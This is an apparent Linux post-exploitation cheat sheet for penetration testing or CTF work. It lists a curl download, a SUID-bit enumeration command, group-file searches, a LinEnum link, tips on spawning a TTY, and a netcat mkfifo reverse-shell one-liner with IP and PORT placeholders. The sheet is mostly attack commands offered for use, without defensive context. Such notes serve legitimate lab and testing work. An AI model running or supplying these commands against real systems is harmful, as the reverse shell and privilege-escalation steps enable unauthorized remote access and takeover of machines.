# Password File
[/etc/passwd](https://www.ibm.com/docs/en/aix/7.2?topic=passwords-using-etcpasswd-file)

# Download file
curl -o localNamed http://0.0.0.0:8000/fileName

# Enumeration:
## SUID bits:
* find / -perm -u=s -type f 2>/dev/null
* [LinEnum](https://github.com/rebootuser/LinEnum)

## Group files:
find / -group groupName -type f 2>/dev/null

## Privilege escalation:
* [Spawn a TTY shell](https://netsec.ws/?p=337)
* If you have a limited TTYY start another reverse shell with Python or another program(e.g limited reverse shell -> Spawn another shell)

## Linux Netcat:
* rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f

## Strings/Information
* strings fname > fileName
* strings fname |more
